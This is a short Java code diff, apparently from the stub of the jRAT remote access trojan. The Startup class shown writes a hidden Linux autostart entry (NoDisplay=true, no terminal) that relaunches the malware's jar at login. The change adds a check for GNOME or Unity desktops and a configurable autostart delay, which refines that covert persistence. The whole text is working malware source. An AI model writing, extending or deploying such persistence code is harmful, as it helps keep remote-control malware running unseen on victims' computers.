@@ -6,6 +6,8 @@ import java.io.PrintWriter;
 
 import se.jrat.stub.utils.Utils;
 
+import com.redpois0n.oslib.DesktopEnvironment;
+import com.redpois0n.oslib.DesktopEnvironment.Family;
 import com.redpois0n.oslib.OperatingSystem;
 import com.redpois0n.oslib.WindowsVersion;
 
@@ -78,6 +80,16 @@ public class Startup {
 				out.println("Exec=java -jar '" + currentJar.getAbsolutePath() + "'");
 				out.println("Terminal=false");
 				out.println("NoDisplay=true");
+				
+				try {
+					boolean correctenv = DesktopEnvironment.getFromCurrentDesktopString().getFamily() == Family.GNOME || DesktopEnvironment.getFromCurrentDesktopString().getFamily() == Family.UNITY;
+					if (Configuration.getConfig().get("delay").equalsIgnoreCase("true") && correctenv) {
+						int ms = Integer.parseInt(Configuration.getConfig().get("delayms"));
+						out.println("X-GNOME-Autostart-Delay=" + ms);
+					}
+				} catch (Exception e) {
+					e.printStackTrace();
+				}
 
 				out.close();
 
